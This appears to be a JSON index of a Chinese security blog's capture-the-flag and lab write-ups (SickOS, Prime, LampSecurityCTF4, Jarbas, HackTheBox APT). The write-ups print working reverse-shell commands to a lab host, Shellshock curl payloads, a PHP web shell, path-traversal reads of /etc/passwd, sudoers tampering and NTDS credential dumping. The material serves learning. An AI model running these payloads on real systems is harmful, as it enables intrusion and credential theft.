{"meta":{"title":"ljxxxxx","subtitle":"宏愿纵未了 奋斗总不太晚","description":"","author":"ljxxxxx","url":"http://ljx-go.top","root":"/"},"pages":[{"title":"categories","date":"2023-03-30T13:09:35.000Z","updated":"2023-03-30T13:09:35.057Z","comments":true,"path":"categories/index-1.html","permalink":"http://ljx-go.top/categories/index-1.html","excerpt":"","text":""},{"title":"categories","date":"2023-03-30T12:29:04.000Z","updated":"2023-03-30T13:14:47.523Z","comments":true,"path":"categories/index.html","permalink":"http://ljx-go.top/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2023-03-30T13:08:52.000Z","updated":"2023-03-30T13:08:52.680Z","comments":true,"path":"tags/index-1.html","permalink":"http://ljx-go.top/tags/index-1.html","excerpt":"","text":""},{"title":"tags","date":"2023-04-02T13:24:10.000Z","updated":"2023-04-02T13:24:10.078Z","comments":true,"path":"tags/index-3.html","permalink":"http://ljx-go.top/tags/index-3.html","excerpt":"","text":""},{"title":"tags","date":"2023-04-02T12:34:27.000Z","updated":"2023-04-02T12:34:27.188Z","comments":true,"path":"tags/index-2.html","permalink":"http://ljx-go.top/tags/index-2.html","excerpt":"","text":""},{"title":"标签","date":"2023-03-30T12:28:55.000Z","updated":"2023-04-02T12:35:04.463Z","comments":true,"path":"tags/index.html","permalink":"http://ljx-go.top/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"","slug":"SickOS","date":"2023-04-08T12:47:51.686Z","updated":"2023-03-14T16:51:05.162Z","comments":true,"path":"2023/04/08/SickOS/","link":"","permalink":"http://ljx-go.top/2023/04/08/SickOS/","excerpt":"","text":"描述12345678ABOUT RELEASEName........: SickOs1.1Date Release: 11 Dec 2015Author......: D4rkSeries......: SickOsObjective...: Get /root/a0216ea4d51874464078c618298b1367.txtTester(s)...: h1tch1Twitter.....: https://twitter.com/D4rk36 信息收集主机发现IP地址 192.168.37.140 nmap扫描 发现端口22 3128 8080 其中8080端口未开启 经过两次nmap漏洞扫描并未发现其他信息 访问3128端口与8080端口结果如下 结果都显示3128端口的服务框架为squid，上网搜寻squid的相关信息 Squid cache（简称为Squid）是一个流行的自由软件（GNU通用公共许可证）的代理服务器和Web缓存服务器。Squid有广泛的用途，从作为网页服务器的前置cache服务器缓存相关请求来提高Web服务器的速度，到为一组人共享网络资源而缓存万维网，域名系统和其他网络搜索，到通过过滤流量帮助网络 安全，到局域网通过DL上网。Squid主要设计用于在Unix一类系统运行。 在此猜测，访问80端口须走3128端口代理 Squid代理设置通过这个思路 我们可以对靶机进行目录爆破 在爆破的同时加入代理服务器 通过浏览器访问前设置proxy代理 Web服务访问robots.txt 访问&#x2F;wolfcms目录 通过谷歌关键词搜索后台登陆地址 成功访问后台登陆地址，是一个登陆界面。面对该登陆界面有以下三种思路 1.弱密码 2.默认账号 3.暴力破解 经过弱密码尝试后，用 admin/admin成功登陆 发现有很多文件内容都是用php脚本来执行，同时也存在文件上传的入口 尝试在Articles中插入一句话木马。 &lt;?php exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.37.135/7777 0&gt;&amp;1&#39;&quot;);?&gt; 在点击Articles时成功反弹shell 提权查看网站配置文件config.php 获得数据库账号密码 root/john@123 查看&#x2F;etc&#x2F;passwd文件，获得靶机的相关用户及其权限 尝试用着数据库的账号密码 对靶机ssh连接 成功ssh连接获得sickos账户 方法二利用Nikto 发现shellshock漏洞 Nikto详细使用教程 nikto常用命令-upodate 升级，更新插件 -host 扫描目标URl -id username:password http认证接口 -list-plugins 列出所有可用的插件 -evasion IDS&#x2F;IPS逃避技术（实例演示里有详细信息） -port 指定端口（默认80） -ssl 使用SSL -useproxy 使用http代理 -vhost 域名 当一个IP拥有多个网站时 使用 nikto交互参数（扫描过程中使用）空格 报告当前扫描状态 v 显示详细信息 d 显示调试信息 e 显示http错误信息 p 显示扫描进度 r 显示重定向信息 c 显示cookie a 显示身份认证过程 q 退出程序 N 扫描下一个目标 P 暂停扫描 nikto -h 192.168.37.140 -useproxy 192.168.37.140:3128 注意此处需要挂代理 漏洞原因 bash使用的环境变量是通过函数名称来调用的，以”()&#123;“开头通过环境变量来定义，而在处理这样的恶意的函数环境变量时，并没有以函数结尾 “&#125;” 为结束，而是执行其后的恶意shell命令 检查漏洞 curl --proxy http://192.168.37.140:3128 -v -A &quot;() &#123; :;&#125;;echo;/usr/bin/whoami&quot; http://192.168.37.140/cgi-bin/status 反弹shell curl --proxy http://192.168.37.140:3128 -v -A &quot;() &#123; :; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/192.168.37.135/7777 0&gt;&amp;1&quot; http://192.168.37.140//cgi-bin/status 小tips 当获得的shell的交互性比较差可以用使用 python 的 pty 来转换为 交互式shell python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; 查看网站根目录文件 通过查看定时任务cron提权 在过滤关键字cron中获得多个定时任务有关的文件夹，其中在cron.d中的automate中发现存在一个定时任务每个一分钟执行网站根目录下的python文件，因此可以通过执行python脚本来反弹shell，进一步提权 使用msfvenom生成shell msfvenom参数简介 利用msfvenom制作木马，并且反弹shell msfvenom -p cmd/unix/reverse_python LHOST=192.168.37.135 LPORT=7778 -f raw 成功获得目标！！！","categories":[],"tags":[]},{"title":"","slug":"Prime","date":"2023-04-08T12:47:51.678Z","updated":"2023-03-28T13:04:51.639Z","comments":true,"path":"2023/04/08/Prime/","link":"","permalink":"http://ljx-go.top/2023/04/08/Prime/","excerpt":"","text":"靶机介绍 This machine is designed for those one who is trying to prepare for OSCP or OSCP-Exam. This is first level of prime series. Some help at every stage is given. Machine is lengthy as OSCP and Hackthebox’s machines are designed. So you have a target to get root flag as well as user flag. If stuck on a point some help are given at a level of enumeration. If any extra help needed Visit our website http://hacknpentest.com and http://hnpsecurity.com. 靶机IP 信息收集nmap扫描sudo nmap --min-rate 10000 -p- 192.168.37.138 sudo nmap -sT -sV -O -p22,80 192.168.37.138 目录扫描dirsearch -u 192.168.37.138 -e * -x 403 &#x2F;dev 这是一个提示，我们通过扫描获得该提示，那说明我们再深度扫描一下 &#x2F;wordpress&#x2F;wp-login.php wordpress的后台登陆系统 &#x2F;wordpress wordpress框架 用dirb 再次扫描 dirb http://192.168.37.138 -X .txt,.zip &#x2F;secret.txt 这个提示告诉我需要对已找到的php页面进行模糊测试，找到一个正确的参数，同时这里也出现了一个location.txt需要我们去查看 其中给了个链接， 该链接是一个kali自带的用于模糊测试的工具 wfuzz dirb http://192.168.37.138 -X .php 寻找php页面 Fuzz&#x2F;image.php &#x2F;index.php 获得参数file 访问file 提示参数的内容不正确，尝试前面提示的location.txt文件 出现另一个参数secrettier360 该参数是image.php上的参数，这里应该是一个本地文件包含漏洞 文件包含curl http://192.168.37.138/image.php?secrettier360=../../../../../../etc/passwd 根据提示查看password.txt文件 curl http://192.168.37.138/image.php?secrettier360=../../../../../../home/saket/password.txt 拿到一个密码 follow_the_ippsec，尝试ssh连接，均失败。 Wordpress WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。 wpscan --url http://192.168.37.138/wordpress -e u 已知一个密码，此时思路是-e参数枚举wordpress后台用户名，获得用户名victor 成功登陆 登陆wordpress后台后，通常的思路是查看Plugins是否允许插入插件orAppearance&#x2F;Theme Editor处是否有可写权限的脚本文件 创建一个zip文件尝试上传，此路不通 在Theme Editor发现可修改secret.php文件，写入一句话木马反弹shell &lt;?php &quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.37.135/7777 0&gt;&amp;1&#39; &quot;?&gt; 接下来就是寻找secret.php文件的路径 WordPress主题存放在 “wp-content&#x2F;themes&#x2F;” 这个文件夹中，我们可以看到各自默认有几个主题文件夹，里面包含了所有的主题目录，并存储为一个目录。每个目录名称通常是一个主题名称。如果我们有需要添加新主题可以将主题的文件夹传到这个目录，然后在后台的外观主题可以激活设置当前主题。 &#x2F;wp-content&#x2F;themes&#x2F;twentynineteen&#x2F;secret.php 得到反弹shell 提权 提示了&#x2F;home&#x2F;saket&#x2F;目录 user.txt中存放密文，用md5解密无果，enc是一个可执行文件，执行时需要输入密码 此处我们可以通过find命令搜索backup文件 （backup文件会有一些关键信息） find / -name &#39;*backup*&#39; 2&gt;/dev/null | sort | less 忽略错误输出 使用“2&gt;&#x2F;dev&#x2F;null”将错误信息输出到“&#x2F;dev&#x2F;null”设备中，从而忽略错误输出。 在Linux系统中，每个进程都有三个标准文件描述符：标准输入（stdin）、标准输出（stdout）和标准错误（stderr）。这些文件描述符分别对应于文件描述符0、1和2。 当我们使用Linux命令时，它们通常会将标准输出和标准错误分别输出到终端，以便我们可以看到它们的输出结果。但是，有时候我们可能不希望看到标准错误的输出信息，可以通过将标准错误输出重定向到“&#x2F;dev&#x2F;null”设备中，从而将其忽略掉。 在命令中，“2”代表标准错误的文件描述符，”&gt;”代表重定向操作符，”&#x2F;dev&#x2F;null”代表一个特殊的设备文件，用于将所有数据丢弃而不保存。 因此，使用“2&gt;&#x2F;dev&#x2F;null”将错误信息输出到“&#x2F;dev&#x2F;null”设备中的意思是将标准错误输出重定向到“&#x2F;dev&#x2F;null”设备中，从而将其忽略掉。 找到opt&#x2F;backup&#x2F;server_database&#x2F;backup_pass 获得 密码：backup_password 成功运行enc文件生成密钥密文文件 提示用md5加密ippsec作为密码解密enc.txt 366a74cb3c959de17d61db30591c39d1 此处也可以用echo与md5sum进行md5加密——但要注意需要-n来取消字符串的换行符，否则加密会有误 利用openssl解密 1for i in $(cat txt);do echo &#x27;nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=&#x27; | openssl enc -d -a -K &#x27;33363661373463623363393539646531376436316462333035393163333964310a&#x27; -$i 2&gt;/dev/null; echo $i; done 最后解密的saket用户的密码为tribute_to_ippsec 切换账户并查看权限 执行提示的文件 &#x2F;home&#x2F;victor&#x2F;undefeated_victor 提示没找到challenge文件，尝试创建challenge文件并写入“&#x2F;bin&#x2F;bash” 成功获得root权限","categories":[],"tags":[]},{"title":"","slug":"linux","date":"2023-04-08T12:47:51.673Z","updated":"2023-04-01T16:59:32.101Z","comments":true,"path":"2023/04/08/linux/","link":"","permalink":"http://ljx-go.top/2023/04/08/linux/","excerpt":"","text":"linux命令 locate ksubdomain hash-identifier 01ec2d8fc11c493b25029fb1f47f39ce识别加密方式 echo &#39;SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==&#39; | base64 -d 犯病突然连不上网 VMware 中kali使用NAT无法连接网络 dpkgdpkg -l：显示于软件包关联的文件 msfvenommsfvenom参数简介 python3 -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’ phpsudo php -S 0:80开启web服务器80端口 awkawk的基本语法如下： 1awk &#x27;pattern &#123; action &#125;&#x27; input-file awk -F’:’ ‘{print$1}’ wcwc -l 查看有什么行内容 uniq将重复的内容过滤掉 trtr -d ‘\\n’ 删除换行符 xxdxxd -p 将字符串转换成16进制 chown&#x2F;chgrp修改文件的所有者&#x2F;所属组 touch创建空文件或更新已有文件的访问和修改时间戳 sed ‘s&#x2F; &#x2F;:&#x2F;g’这是一个Sed的替换命令，用于将文本中所有的空格（” “）替换为冒号（”:”）。 “s”是替换（substitute）命令的缩写 “g”表示全局匹配（即替换所有匹配到的字符串，而不只是第一个） cpcp 文件路径 . .表示当前路径","categories":[],"tags":[]},{"title":"","slug":"LampSecurityCTF4","date":"2023-04-08T12:47:51.669Z","updated":"2023-03-28T16:15:05.159Z","comments":true,"path":"2023/04/08/LampSecurityCTF4/","link":"","permalink":"http://ljx-go.top/2023/04/08/LampSecurityCTF4/","excerpt":"","text":"LampSecurityCTF4信息收集主机发现sudo nmap -sn 192.168.37.0/24 主机IP：192.168.37.148 端口扫描sudo nmap --min-rate=10000 -p- 192.168.37.148 sudo nmap -sT -sV -O -p22,25,80,631 192.168.37.148 目录扫描 robots.txt中显示 123456User-agent: *Disallow: /mail/Disallow: /restricted/Disallow: /conf/Disallow: /sql/Disallow: /admin/ /conf/访问报错,/restricted/,/mail/,/admin/都需要登录 /sql/目录可以直接查看,/sql/db.sql可以被直接访问,内容如下 12345use ehks;create table user (user_id int not null auto_increment primary key, user_name varchar(20) not null, user_pass varchar(32) not null);create table blog (blog_id int primary key not null auto_increment, blog_title varchar(255), blog_body text, blog_date datetime not null);create table comment (comment_id int not null auto_increment primary key, comment_title varchar (50), comment_body text, comment_author varchar(50), comment_url varchar(50), comment_date datetime not null); &#x2F;pages是一个目录，有blog.php等文件，与前端的页面内容一致，可能存在路径穿越 Web渗透sql注入 在测试中发现sql注入点 利用sqlmap获得数据库内容 sqlmap -u &#39;http://192.168.37.148/index.html?page=blog&amp;title=Blog&amp;id=2&#39; --dbs --dump --batch 均可进入/admin/后台,测试同样可以作为ssh连接并提权到root 在SSH连接时出现该错误，对其补足参数 sudo ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss pmoore@192.168.37.148 目录穿越上文提到url的访问格式是 index.html?page=blog&amp;title=Blog&amp;id=2推断源码为include($_GET[$page].&#39;.php&#39;) 利用whatweb分析出其php版本为5.1.2， php版本小于5.3.4，存在%00截断","categories":[],"tags":[]},{"title":"","slug":"JARBAS","date":"2023-04-08T12:47:51.661Z","updated":"2023-03-11T15:40:32.016Z","comments":true,"path":"2023/04/08/JARBAS/","link":"","permalink":"http://ljx-go.top/2023/04/08/JARBAS/","excerpt":"","text":"靶场介绍靶机名：JARBAS Jarbas靶场下载地址: https://download.vulnhub.com/jarbas/Jarbas.zip 信息收集主机发现靶机IP地址 192.168.37.139 nmap扫描nmap --min-rate 10000 -p- 192.168.37.139 两次扫描有不同的结果 因此我们尽量在扫描时重复一次 防止端口漏扫 查询端口服务对应的版本 nmap -sT -sV -O -p22,80,3306,8080 192.168.37.139 nmap -sU -p22,80,3306,8080 192.168.37.139 nmap漏洞扫描 nmap --script=vuln -p22,80,3306,8080 192.168.37.139 在80端口中发现潜在的目录列表 &#x2F;icons 在8080端口中发现&#x2F;robots.txt文件 访问80端口web服务 访问8080端口 疑似后台登陆账密 目录扫描dirsearch -u 192.168.37.139 -x 403 访问access.html 一眼md5加密 解密得到 对应的数据如下 user passwd tiago italia99 trindade vipsu eder marianna 用于8080端口登陆，在经过上述对应账密登陆失败后，通过打乱搭配尝试登陆 最终eder vipsu 登陆 （此处由于数据内容较少没有bp，当数据过多时则需要用bp快速找出正确账号密码） Getshell 在New Item处可以创建一个新项目 尝试创建一个名为test1的项目，在设置项目时看到Build选项中存在Execute shell 此处我们可以通过bash getshell getshell语句为：/bin/bash -i &gt;&amp; /dev/tcp/192.168.37.135/7777 0&gt;&amp;1 命令 命令详解 bash -i 产生一个bash交互环境。 &gt;&amp; 将联合符号前面的内容与后面相结合，然后一起重定向给后者。 &#x2F;dev&#x2F;tcp&#x2F;192.168.37.135&#x2F;7777 Linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机192.168.37.135的7777端口建立一个tcp连接。 0&gt;&amp;1 将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。 Bash反弹一句完整的解读过程就是： Bash产生了一个交互环境和本地主机主动发起与攻击机7777端口建立的连接（即TCP 7777会话连接）相结合，然后在重定向个TCP 7777会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。 攻击机本地监听7777端口 成功连接 提权查询shell的权限 sudo -l 无任何权限，需要提权 查询定时任务 定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。cron 是 Linux 或者类 Unix 系统中最为实用的工具之一。cron 服务（守护进程）在系统后台运行，并且会持续地检查 /etc/crontab 文件和 /etc/cron.*/ 目录。它同样也会检查 &#x2F;var&#x2F;spool&#x2F;cron&#x2F; 目录。 存在一个定时任务 任务解释：每5分钟以root权限执行&#x2F;etc&#x2F;script&#x2F;CleaningScript.sh ，执行的结果将被丢弃 脚本内容如下 方法一 将getshell payload 写入&#x2F;etc&#x2F;script&#x2F;CleaningScript.sh 同时监听7776端口待执行后可以获得root权限 方法二 修改CleaningScript.sh内容，使它能够修改sudoers，给予jenkins免密码执行sudo的权限。并利用crontab定时执行该任务echo &quot;echo &#39;jenkins ALL=(ALL) NOPASSWD:ALL&#39; &gt;&gt; /etc/sudoers&quot; &gt;&gt; /etc/script/CleaningScript.sh sudoers用来保存一些用户，使这些用户可以通过sudo命令来暂时获取root的权限 成功获得root权限","categories":[],"tags":[]},{"title":"","slug":"APT","date":"2023-04-08T12:47:51.656Z","updated":"2023-04-03T08:54:37.179Z","comments":true,"path":"2023/04/08/APT/","link":"","permalink":"http://ljx-go.top/2023/04/08/APT/","excerpt":"","text":"ART介绍第一次接触域渗透，本文档通过该视频进行学习，记录具体过程与相关知识点，难以做到彻底吃透知识点，但求有所了解 视频链接：https://www.bilibili.com/video/BV1FR4y1r7Do/?spm_id_from=333.999.0.0&amp;vd_source=1b2efa03ad2457246e91a7d817aaecae 视频简介 「红队笔记」学渗透必打百台靶机实操精讲-APT 。Hackthebox名为APT靶机的域渗透，即动态目录渗透，Insane级别即疯狂难度级别，无论从用户评价还是官方定级都是高难度级别或接近最高难度级别，知识点密集到让你望而却步，涉及IPv6，密码破解、大量横向移动，Responder提权，LOLBAS , GTFOBins靠山吃山的攻防思想等，既是典型的域渗透样本，也是综合攻防的典范。想实操的需要有hackthebox的vip账户。不实操，只理解思路和学习知识点也是不错的学习方式。全程4k精剪。 该靶机的IP地址为：10.129.96.60 APT开局常规信息收集nmap端口扫描 12#参数分析-sC 或--script=default：启动默认类NSE脚本。 //脚本引擎功能（Nmap Scripting Engine，NSE） 扫描结果分析： 服务器大概率为：Windows 2016 开放两个端口：80WEB服务 ​ 135msrpc服务 nmap漏洞扫描无结果 gobuster目录扫描 出现许多301重定向页面，皆无法访问 Web渗透访问80端口并分析 该网站提供虚拟服务器服务的网站，网页类型为html文件，皆为静态页面 页面右上角的SUPPORT为动态页面，可以submit信息 提交信息后出现如上报错，出现一个新ip地址：10.13.38.16 F12查看页面代码 以post提交内容给ip地址为10.13.38.16的主机 Ctrl +U查看源码 出现关键词：HTTrack Website Copier&#x2F;3.x 什么是HTTrack Website Copier&#x2F;3.x 基于windows的图形界面的二进制应用 查询利用方式： searchexploit查询 无结果 Google查询 存在堆栈缓冲区溢出漏洞，与应用有关，与web服务无直接关系，无法利用。同时根据上述目录爆破结果显示无法与HTTrack进行交互 135端口渗透 MSRPC（MicroSoft Remote Procedure Call，微软远程过程调用） Depending on the host configuration, the RPC endpoint mapper can be accessed through TCP and UDP port 135, via SMB with a null or authenticated session (TCP 139 and 445), and as a web service listening on TCP port 593. https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc RPC rpcclient使用rpcclient工具进行交互 （rpcclient默认的端口号是139，-p 指定端口） 行不通 impacket.rpcdump.py impacket python工具包 环境变量导入：export PATH&#x3D;&#x2F;uer&#x2F;share&#x2F;doc&#x2F;python3-impacket&#x2F;examples:$PATH Impacket是一个Python类库，用于对SMB1-3或IPv4 &#x2F; IPv6 上的TCP、UDP、ICMP、IGMP，ARP，IPv4，IPv6，SMB，MSRPC，NTLM，Kerberos，WMI，LDAP等协议进行低级编程访问。 Rpcdump.py该脚本将转储在目标上注册的RPC端点和字符串bindings列表。它也会尝试将它们与一些知名的端点进行匹配。 要获取目标RPC服务的UUID，可以使用rpcdump工具，它可以列出网络中所有可用的RPC服务以及它们的UUID。一旦找到目标服务的UUID，就可以使用rpcmap进行爆破。 将rpc协议下在135端口上运行的组件或方法列出 impacket.rpcmap.py rpcmap.py：扫描监听 DCE&#x2F;RPC 接口。这将绑定到 MGMT 接口并获取接口 UUID 列表。如果 MGMT 接口不可用，它会获取在野外看到的接口 UUID 列表，并尝试绑定到每个接口。 rpcmap的功能类似于端口扫描工具，它会自动检测网络中运行的RPC服务，并提供有关这些服务的详细信息，例如服务名称、绑定端口、支持的协议等。rpcmap还可以使用一些特定的选项来执行漏洞扫描和安全评估，以帮助发现可能存在的安全问题。 我们可以通过rpcmap爆破UUID 具体来说，每个RPC接口或服务都有一个唯一的UUID，用于标识该接口或服务。当客户端调用远程过程时，它必须指定要调用的RPC接口或服务的UUID，以便服务器能够找到正确的实现和处理该请求。同样地，当服务器向客户端返回结果时，它也必须使用相同的UUID，以便客户端能够正确地处理返回结果。 相关参数 爆破出有用的UUID，通过搜索引擎我们来查看具体是什么接口 RPC的IObjectExporter接口 在爆破中显示操作数3和5是success的 对应的内容如上 5是3的扩展 谷歌关键词：OXID network Resolver https://medium.com/nets3c/remote-enumeration-of-network-interfaces-without-any-authentication-the-oxid-resolver-896cff530d37 python利用脚本 123456789101112131415from impacket.dcerpc.v5 import transportfrom impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE as authLevelfrom impacket.dcerpc.v5.dcomrt import IObjectExporterip = &quot;192.168.1.7&quot;stringBinding = r&#x27;ncacn_ip_tcp:%s&#x27; % iprpctransport = transport.DCERPCTransportFactory(stringBinding)portmap = rpctransport.get_dce_rpc()portmap.set_auth_level(authLevel)portmap.connect()objExporter = IObjectExporter(portmap)bindings = objExporter.ServerAlive2()print(&quot;[*] Retrieving network interface of &quot; + ip)for address in bindings: NetworkAddr = address[&#x27;aNetworkAddr&#x27;] print(&quot;Address: &quot; + NetworkAddr) 获得ipv6地址 过程总结：通过rpcmap映射UUID，并通过暴力破解UUID获得其中一个UUID有交互信息的，通过UUID在搜索引擎搜索其功能，最后通过相关关键字，搜到了ioxidresolver去识别远程网络接口，获取IP地址 ipv6端口扫描 二次扫描结果 通过这些端口可以判断去这台机器是一台域控制器 #什么是域控制器 域控制器（Domain Controller）是指运行了Active Directory（AD）服务并存储了用户、计算机等安全主体的账号信息和访问权限信息的计算机。域控制器通过对用户身份进行认证并授予其访问网络资源的权限，实现对整个域的集中管理。 在一个域中，通常至少需要一个域控制器，它的主要职责是： 认证用户和计算机的身份：域控制器是域中用户和计算机的安全认证中心，它验证登录请求的身份并授予相应的访问权限。 管理域中的安全策略：域控制器管理域中的安全策略，包括密码策略、账户锁定策略等，以确保域中的安全性。 维护域中的目录服务：域控制器存储了域中所有安全主体的账号信息和访问权限信息，同时也包括其他与域相关的信息，如组策略等。 处理域中的复制：域控制器之间会相互复制域目录数据，以确保域中所有域控制器的数据是同步的。 在 Windows 系统中，域控制器默认会监听以下端口，可以通过检测这些端口是否打开来判断一台服务器是否为域控制器： TCP端口： 135、389、445、636、3268、3269、49152-65535 UDP端口： 53、88、123、137、138、389 其中，TCP 135 端口是用于RPC（Remote Procedure Call）服务，是域控制器的主要通信端口； TCP 389 端口是LDAP（Lightweight Directory Access Protocol）服务的端口，也是域控制器的核心服务端口； TCP 445 端口用于 SMB（Server Message Block）服务 UDP 389 端口用于LDAP的快速搜索功能； TCP 636 端口是LDAP over SSL的安全端口； TCP 3269 端口是用于全局目录的LDAP搜索的安全端口； UDP 53 端口是DNS（Domain Name System）服务的端口，用于名称解析， TCP&#x2F;UDP 88 端口是Kerberos认证服务的端口 UDP 123 端口是用于时间同步服务的端口； UDP 137 和 UDP 138 端口是NetBIOS（Network Basic Input&#x2F;Output System）服务的端口，用于广播查询域控制器。 每个端口作用 端口 服务 53 用于DNS（域名系统）服务，提供了将域名转换为IP地址的功能。当你在浏览器中输入网址时，计算机需要使用DNS服务来将网址转换为IP地址，以便连接到相应的服务器。 88 用于Kerberos身份验证服务，提供了安全的身份验证机制。用户需要使用自己的用户名和密码进行身份验证，以便访问受保护的资源和数据。 135 用于远程程序调用服务，也称为RPC服务。当你需要在你的电脑上安装远程服务器管理工具，并在另一台计算机上运行该工具，那么你需要打开 TCP 135 端口，以便进行远程连接和调用。 389 用于LDAP（轻量级目录访问协议）服务，提供了对目录中的数据进行查找、添加、删除和修改的功能。当需要访问公司的域控制器来查找某个员工的联系方式或组织结构信息时 445 用于SMB（服务器消息块）服务，提供了对共享文件和打印机的访问权限。在一个局域网内，当你需要在两台计算机之间共享文件时，可以使用SMB服务 464 用于Kerberos密码更改服务，提供了更改Kerberos身份验证密码的功能。用户需要定期更改他们的密码以提高安全性，Kerberos密码更改服务提供了这个功能。 593 用于RPC over HTTP服务，提供了通过HTTP隧道进行远程程序调用的功能。在远程连接到一台计算机时，可以使用RPC over HTTP服务来加密通信以提高安全性。 636 用于安全的LDAP通信，也称为LDAP over SSL。在一个企业网络中，当你需要通过LDAP服务来查找或更改受保护的目录数据时，你需要使用安全的LDAP通信，以确保你的通信过程是加密和安全的。 3268 用于全局目录服务，提供了对全局目录中的数据进行查找和修改的功能。在一个跨域网络中，当你需要从多个域控制器中查找目录数据时，你需要使用全局目录服务来执行此操作 3269 用于安全的全局目录服务，提供了对全局目录中的数据进行安全访问的功能。在一个跨域网络中，当你需要使用安全的方式从多个域控制器中查找目录数据时，你需要使用安全的全局目录服务来执行此操作 5985 用于WinRM（Windows远程管理）服务，提供了对远程计算机进行管理和监视的功能。在一个企业网络中，IT管理员需要使用WinRM服务来远程管理和监视多台计算机，以便进行补丁管理、安全策略配置等操作。 9389 用于WS-Management服务，提供了对远程计算机进行管理的功能。在一个企业网络中，IT管理员需要使用WS-Management服务来远程管理多台计算机，以便进行软件安装、配置管理等操作。 处理端口号并用nmap扫描获取具体内容 ——此处需要-6参数 表示ip地址为ipv6地址 ART鏖战修改hosts文件解析地址 445端口渗透 smbclient 类似ftp的客户端，用于访问服务器上的SMB&#x2F;CIFS资源 亦存在与ftp类似的匿名登陆 在要求输入密码时，按回车匿名登陆 访问上述各个目录 get命令下载backup.zip文件 无信息（这三个目录为默认目录，一般没什么信息） zip文件分析zip备份文件（优先分析zip文件，勿直接解压存在风险） Unzip是一个在计算机上解压缩（解压）文件的命令行工具或软件程序。 Active Directory 动态目录ntds.dit文件 ——是windows环境中的sam文件 ntds.dit 是 Windows Server 操作系统上 Active Directory 域服务（AD DS）使用的数据库文件，它代表 “NT Directory Service Directory Information Tree”。该文件包含了域中所有对象的信息，如用户、计算机、组等，是 AD DS 数据库的核心文件。 SAM文件是Windows操作系统中存储本地账户信息的文件，它代表“Security Accounts Manager”，通常存储在%SystemRoot%\\System32\\Config\\SAM中。SAM文件包含了本地计算机上的所有本地账户信息，如用户名、密码散列值、安全标识符（SID）等。当用户进行本地登录验证时，系统会读取SAM文件中的信息进行身份验证。SAM文件是Windows操作系统安全性的关键组成部分，应该受到保护，只允许系统管理员访问。 ntds.jfm文件 NTDS.jfm是Windows Server操作系统上Active Directory域服务（AD DS）使用的日志文件，它代表“NT Directory Service Journal File Metadata”。NTDS.jfm文件记录了在更新Active Directory数据库（NTDS.dit）期间发生的所有操作，包括新增、修改和删除操作等。当NTDS.dit文件发生更改时，操作会被写入NTDS.jfm文件中，以确保数据库的完整性和一致性。NTDS.jfm文件通常存储在%SystemRoot%\\NTDS目录中，并只能由AD DS服务访问和修改。在出现故障或数据恢复时，NTDS.jfm文件可以帮助恢复和重建Active Directory数据库。 registry 注册表目录 很有用 注册表中的 SECURITY 键是 Windows 操作系统中存储安全设置的一个重要分支。它存储了本地计算机安全策略、用户帐户和组、安全标识符（SIDs）等与安全性相关的信息。 注册表中的 SYSTEM 键是 Windows 操作系统中存储系统配置信息的一个重要分支。它存储了启动过程中系统硬件和软件的配置信息，例如设备驱动程序、系统服务和操作系统的安装配置等。 如果unzip -l没法获取压缩包的内容还可以使用foremost，binwalk命令分析（接触过ctf中杂项的dddd） zip文件密码破解 zip文件存在密码 将图中红框中的哈希值存入hash4backup文件用于密码破解 zip2john工具将ZIP文件格式转换为John the Ripper程序所需的哈希值格式，使得用户可以使用John the Ripper程序对ZIP文件进行暴力破解。 在使用John the Ripper破解程序时，需要对所破解的文件类型为a的文件利用a2john命令进行hash转换，如此时要破解zip类型的文件，则使用zip2john将文件转换成zip ，该程序在kali中用john命令实现 ​ rockyou.txt是一个常用的密码字典文件，包含了数百万条常用密码和常见字符串组合。该文件由密码管理公司RockYou于2009年遭受数据泄露事件中泄露出来，并因此成为了一个广泛使用的密码字典。由于rockyou.txt中包含了大量常用密码和字符串组合，因此它是密码破解和渗透测试工具中广泛使用的一个字典文件。 成功获取密码：iloveyousomuch ntds数据提取与处理由于ntds.dit文件 中存放着密码等信息，用impacket库中的serectsdump.py读取 通过在命令行中添加”-system”参数来指定要提取信息的目标Windows系统。该参数后面需要跟上目标系统的System文件的本地路径或UNC路径。System文件是包含了Windows系统的安全策略和用户凭据哈希值的文件。如果未指定”-system”参数，则默认使用当前正在运行该工具的本地系统的System文件。 例如，以下命令将使用本地System文件提取目标IP地址为192.168.0.1的Windows系统中的凭据和密码哈希： 1python secretsdump.py 192.168.0.1 -u username -p password 如果要使用指定路径的System文件，可以添加”-system”参数并指定文件路径，例如： 1python secretsdump.py 192.168.0.1 -u username -p password -system C:\\Windows\\System32\\config\\SYSTEM Evil-WinRM 